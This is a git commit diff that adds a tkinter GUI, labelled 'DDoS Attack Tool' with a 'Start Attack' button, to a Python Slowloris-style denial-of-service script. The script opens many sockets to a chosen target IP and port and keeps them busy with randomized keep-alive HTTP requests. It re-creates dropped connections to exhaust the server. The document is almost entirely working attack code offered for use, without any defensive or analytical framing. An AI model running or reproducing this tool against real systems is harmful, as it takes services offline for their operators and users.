b406777273d4e39b821822f5b9cf478ea03f642f
learnershakil <learnershakil@gmail.com>
2023-05-20 22:32:13 +0530

    GUI V1

--- dos.py
+++ dos.py
@@ -4,6 +4,8 @@ import socket
 import time
 import logging
 import sys
+import tkinter as tk
+from tkinter import messagebox
 
 regular_headers = [
     "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
@@ -35,16 +37,7 @@ def send_request(s, method="GET", url="/", headers=None, data=None):
     request = "{} {} HTTP/1.1\r\n".format(method, url)
     s.send(request.encode('UTF-8'))
 
-def main():
-    if len(sys.argv) < 5:
-        print("Usage: {} example.com 80 100 10".format(sys.argv[0]))
-        return
-
-    ip = sys.argv[1]
-    port = sys.argv[2]
-    socket_count = int(sys.argv[3])
-    print('\033[1;32;40m Creating Sockets...')
-    timer = int(sys.argv[4])
+def main(ip, port, socket_count, timer):
     socket_list = []
 
     for _ in range(socket_count):
@@ -53,58 +46,42 @@ def main():
         except socket.error:
             break
         socket_list.append(s)
-        print('.', end='', flush=True)
-
-    print('\n')
 
     while True:
-        print("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list)))
-
         for s in socket_list:
             try:
-                # Add a random delay to the next keep-alive header
                 time.sleep(random.randint(1, 10))
 
-                # Choose a random HTTP method
                 http_methods = ["GET", "POST", "PUT", "DELETE"]
                 method = random.choice(http_methods)
 
-                # Generate a random URL
                 urls = ["/", "/page1", "/page2", "/api/data"]
                 url = random.choice(urls)
 
-                # Generate random data for POST/PUT requests
                 data = None
                 if method in ["POST", "PUT"]:
                     data = generate_random_data()
 
-                # Generate custom headers for the request
                 headers = generate_custom_headers()
 
                 send_request(s, method, url, headers, data)
 
-                # Process and handle the HTTP response
                 response = s.recv(1024)
-                # You can add your response processing logic here
-                # For example, logging the response status code
                 logging.info("Response status code: {}".format(response.decode('UTF-8')))
             except socket.error:
                 socket_list.remove(s)
                 logging.error("Socket error occurred.")
 
         for _ in range(socket_count - len(socket_list)):
-            print("\033[1;34;40m\nRe-creating Socket...")
             try:
                 s = init_socket(ip, port)
                 if s:
                     socket_list.append(s)
             except socket.error:
                 break
-                logging.error("Failed to create socket.")
 
         time.sleep(timer)
 
-        # Check for errors
         for s in socket_list:
             try:
                 s.recv(1024)
@@ -115,22 +92,63 @@ def main():
         if len(socket_list) == 0:
             break
 
-        # Add a random delay to the time between each keep-alive header
         time.sleep(random.randint(1, 10))
 
 def generate_random_data():
-    # Generate random data for the request body
     data_size = random.randint(1, 1024)
     return 'x' * data_size
 
 def generate_custom_headers():
-    # Generate custom headers for the request
     custom_headers = [
         "X-Request-ID: {}".format(random.randint(1, 1000)),
         "Content-Type: application/json"
     ]
     return random.choice(custom_headers)
 
-if __name__ == "__main__":
-    logging.basicConfig(filename="log.txt", level=logging.INFO)
-    main()
+def start_attack():
+    ip = entry_ip.get()
+    port = entry_port.get()
+    socket_count = int(entry_socket_count.get())
+    timer = int(entry_timer.get())
+
+    try:
+        main(ip, port, socket_count, timer)
+    except Exception as e:
+        messagebox.showerror("Error", str(e))
+
+# Create the GUI window
+window = tk.Tk()
+window.title("DDoS Attack Tool")
+
+# Create and position the labels
+label_ip = tk.Label(window, text="Target IP:")
+label_ip.grid(row=0, column=0, padx=5, pady=5)
+
+label_port = tk.Label(window, text="Target Port:")
+label_port.grid(row=1, column=0, padx=5, pady=5)
+
+label_socket_count = tk.Label(window, text="Socket Count:")
+label_socket_count.grid(row=2, column=0, padx=5, pady=5)
+
+label_timer = tk.Label(window, text="Timer (seconds):")
+label_timer.grid(row=3, column=0, padx=5, pady=5)
+
+# Create and position the entry fields
+entry_ip = tk.Entry(window)
+entry_ip.grid(row=0, column=1, padx=5, pady=5)
+
+entry_port = tk.Entry(window)
+entry_port.grid(row=1, column=1, padx=5, pady=5)
+
+entry_socket_count = tk.Entry(window)
+entry_socket_count.grid(row=2, column=1, padx=5, pady=5)
+
+entry_timer = tk.Entry(window)
+entry_timer.grid(row=3, column=1, padx=5, pady=5)
+
+# Create and position the start button
+start_button = tk.Button(window, text="Start Attack", command=start_attack)
+start_button.grid(row=4, column=0, columnspan=2, padx=5, pady=5)
+
+# Start the GUI event loop
+window.mainloop()
